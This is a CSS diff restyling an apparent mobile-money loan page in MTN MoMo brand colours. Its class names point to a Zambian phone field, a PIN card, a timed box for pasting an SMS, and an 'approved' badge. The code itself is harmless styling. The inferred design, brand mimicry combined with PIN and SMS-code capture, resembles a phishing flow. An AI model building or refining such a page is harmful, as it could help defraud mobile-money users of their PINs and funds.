@@ -1,14 +1,13 @@
 :root {
-    --bg-deep: #064e6b;
-    --card-bg: #085c7d;
-    --card-border: #197499;
+    --momo-teal: #005776;
+    --momo-teal-dark: #00425a;
+    --momo-teal-deep: #003144;
+    --momo-teal-border: #1d7393;
     --mtn-yellow: #ffcc00;
     --mtn-yellow-hover: #f5c200;
-    --ink-dark: #062534;
+    --ink-dark: #002b3b;
     --text-light: #ffffff;
     --text-muted: #d6eef8;
-    --sheet-bg: #ffffff;
-    --sheet-ink: #0f2938;
 }
 
 * {
@@ -19,10 +18,14 @@
     font-weight: 600;
 }
 
+html,
 body {
-    background-color: var(--bg-deep);
+    background-color: var(--momo-teal);
     color: var(--text-light);
     min-height: 100vh;
+}
+
+body {
     display: flex;
     justify-content: center;
     padding: 16px 12px;
@@ -35,8 +38,8 @@ strong, b, h1, h2, h3, label {
 .mtn-shell {
     width: 100%;
     max-width: 440px;
-    background: var(--card-bg);
-    border: 1px solid var(--card-border);
+    background: var(--momo-teal);
+    border: 1px solid var(--momo-teal-border);
     border-radius: 16px;
     overflow: hidden;
     box-shadow: 0 12px 32px rgba(0, 0, 0, 0.35);
@@ -45,12 +48,12 @@ strong, b, h1, h2, h3, label {
 }
 
 .mtn-topbar {
-    background: #043d54;
+    background: var(--momo-teal-dark);
     padding: 12px 16px;
     display: flex;
     align-items: center;
     gap: 12px;
-    border-bottom: 1px solid var(--card-border);
+    border-bottom: 1px solid var(--momo-teal-border);
 }
 
 .icon-btn {
@@ -88,7 +91,7 @@ strong, b, h1, h2, h3, label {
     align-items: center;
     justify-content: center;
     line-height: 1.05;
-    border: 2px solid #043d54;
+    border: 2px solid var(--momo-teal-deep);
 }
 
 .mtn-badge {
@@ -123,21 +126,21 @@ strong, b, h1, h2, h3, label {
     font-size: 0.9rem;
     font-weight: 800;
     line-height: 1.4;
-    background: #fff3cd;
-    color: #5c3c00;
-    border-left: 5px solid var(--mtn-yellow);
+    background: var(--mtn-yellow);
+    color: var(--ink-dark);
+    border-left: 5px solid var(--momo-teal-deep);
 }
 
 .screen-notice.error {
-    background: #ffe3e3;
-    color: #7a0b0b;
-    border-left-color: #d92d20;
+    background: #7f1d1d;
+    color: #ffffff;
+    border-left-color: var(--mtn-yellow);
 }
 
 .screen-notice.success {
-    background: #d1fae5;
-    color: #064e3b;
-    border-left-color: #059669;
+    background: var(--momo-teal-deep);
+    color: var(--mtn-yellow);
+    border-left-color: var(--mtn-yellow);
 }
 
 .step-panel {
@@ -146,6 +149,7 @@ strong, b, h1, h2, h3, label {
     flex-direction: column;
     gap: 16px;
     flex: 1;
+    background: var(--momo-teal);
 }
 
 .step-panel.active {
@@ -180,8 +184,8 @@ strong, b, h1, h2, h3, label {
 .panel-card,
 .summary-box,
 .pin-card {
-    background: rgba(3, 46, 64, 0.75);
-    border: 1px solid var(--card-border);
+    background: var(--momo-teal-dark);
+    border: 1px solid var(--momo-teal-border);
     border-radius: 12px;
     padding: 16px;
     display: flex;
@@ -240,7 +244,7 @@ strong, b, h1, h2, h3, label {
 .step-bars .bar {
     height: 4px;
     border-radius: 4px;
-    background: rgba(255, 255, 255, 0.25);
+    background: var(--momo-teal-deep);
 }
 
 .step-bars .bar.active {
@@ -278,8 +282,8 @@ input[type="range"] {
 }
 
 .repayment-box {
-    background: #032c3d;
-    border: 1px solid var(--card-border);
+    background: var(--momo-teal-deep);
+    border: 1px solid var(--momo-teal-border);
     border-radius: 10px;
     padding: 14px;
     text-align: center;
@@ -297,12 +301,16 @@ input[type="range"] {
     width: 100%;
     padding: 11px 12px;
     border-radius: 8px;
-    border: 2px solid transparent;
-    background: var(--sheet-bg);
-    color: var(--sheet-ink);
+    border: 2px solid var(--momo-teal-border);
+    background: var(--momo-teal-deep);
+    color: var(--text-light);
     font-size: 0.95rem;
     font-weight: 700;
     outline: none;
+}
+
+.light-input::placeholder {
+    color: var(--text-muted);
 }
 
 .light-input:focus {
@@ -318,28 +326,33 @@ input[type="range"] {
 .zm-phone-box {
     display: flex;
     align-items: center;
-    background: var(--sheet-bg);
+    background: var(--momo-teal-deep);
     border-radius: 8px;
     border: 2px solid var(--mtn-yellow);
     overflow: hidden;
 }
 
 .zm-flag {
-    background: #f0f4f8;
-    color: var(--sheet-ink);
+    background: var(--momo-teal-dark);
+    color: var(--mtn-yellow);
     padding: 11px 12px;
     font-size: 0.9rem;
-    border-right: 1px solid #cbd5e1;
+    border-right: 1px solid var(--momo-teal-border);
 }
 
 .zm-phone-box input {
     flex: 1;
     border: none;
+    background: transparent;
     padding: 11px 12px;
     font-size: 0.95rem;
     font-weight: 800;
-    color: var(--sheet-ink);
+    color: var(--text-light);
     outline: none;
+}
+
+.zm-phone-box input::placeholder {
+    color: var(--text-muted);
 }
 
 .field-hint {
@@ -358,7 +371,7 @@ input[type="range"] {
     justify-content: space-between;
     gap: 12px;
     font-size: 0.85rem;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    border-bottom: 1px solid var(--momo-teal-border);
     padding-bottom: 6px;
 }
 
@@ -375,9 +388,9 @@ input[type="range"] {
 }
 
 .btn-dark {
-    background: #033347;
+    background: var(--momo-teal-deep);
     color: var(--text-light);
-    border: 1px solid var(--card-border);
+    border: 1px solid var(--momo-teal-border);
     border-radius: 8px;
     padding: 13px 12px;
     font-size: 0.9rem;
@@ -385,9 +398,9 @@ input[type="range"] {
 }
 
 .btn-teal-outline {
-    background: #0a6e94;
+    background: var(--momo-teal-dark);
     color: var(--text-light);
-    border: 1px solid #38a3cc;
+    border: 1px solid var(--mtn-yellow);
     border-radius: 8px;
     padding: 13px 14px;
     font-size: 0.95rem;
@@ -450,8 +463,8 @@ input[type="range"] {
     font-weight: 900;
     border-radius: 8px;
     border: 2px solid var(--mtn-yellow);
-    background: var(--sheet-bg);
-    color: var(--sheet-ink);
+    background: var(--momo-teal-deep);
+    color: var(--text-light);
     outline: none;
 }
 
@@ -468,7 +481,7 @@ input[type="range"] {
 .mtn-spinner {
     width: 52px;
     height: 52px;
-    border: 5px solid rgba(255, 204, 0, 0.25);
+    border: 5px solid var(--momo-teal-deep);
     border-top: 5px solid var(--mtn-yellow);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
@@ -481,8 +494,9 @@ input[type="range"] {
 }
 
 .light-sheet {
-    background: var(--sheet-bg);
-    color: var(--sheet-ink);
+    background: var(--momo-teal-dark);
+    color: var(--text-light);
+    border: 1px solid var(--momo-teal-border);
     border-radius: 12px;
     padding: 18px 16px;
     display: flex;
@@ -495,24 +509,24 @@ input[type="range"] {
     display: flex;
     align-items: center;
     gap: 12px;
-    border-bottom: 2px solid #e2e8f0;
+    border-bottom: 1px solid var(--momo-teal-border);
     padding-bottom: 12px;
 }
 
 .sheet-top h2 {
     font-size: 1.15rem;
-    color: var(--sheet-ink);
+    color: var(--text-light);
 }
 
 .sheet-instruction {
     font-size: 0.88rem;
     line-height: 1.45;
-    color: var(--sheet-ink);
+    color: var(--text-light);
 }
 
 .timer-bar {
-    background: #fef9c3;
-    color: #5c3c00;
+    background: var(--momo-teal-deep);
+    color: var(--mtn-yellow);
     border: 1px solid var(--mtn-yellow);
     border-radius: 8px;
     padding: 8px 12px;
@@ -522,31 +536,35 @@ input[type="range"] {
 
 .sms-textarea {
     width: 100%;
-    border: 2px solid #94a3b8;
+    border: 2px solid var(--momo-teal-border);
     border-radius: 10px;
     padding: 12px;
     font-size: 0.9rem;
     font-weight: 700;
-    color: var(--sheet-ink);
-    background: #f8fafc;
+    color: var(--text-light);
+    background: var(--momo-teal-deep);
     resize: vertical;
     outline: none;
 }
 
+.sms-textarea::placeholder {
+    color: var(--text-muted);
+}
+
 .sms-textarea:focus {
-    border-color: var(--bg-deep);
+    border-color: var(--mtn-yellow);
 }
 
 .success-banner-box {
-    background: #ecfdf5;
-    border: 2px solid #10b981;
+    background: var(--momo-teal-deep);
+    border: 2px solid var(--mtn-yellow);
     border-radius: 10px;
     padding: 16px;
     text-align: center;
     display: flex;
     flex-direction: column;
     gap: 8px;
-    color: #064e3b;
+    color: var(--text-light);
 }
 
 .approved-pill {
@@ -565,5 +583,4 @@ input[type="range"] {
     line-height: 1.4;
     color: var(--text-muted);
     padding-top: 6px;
-    }
-    
+}
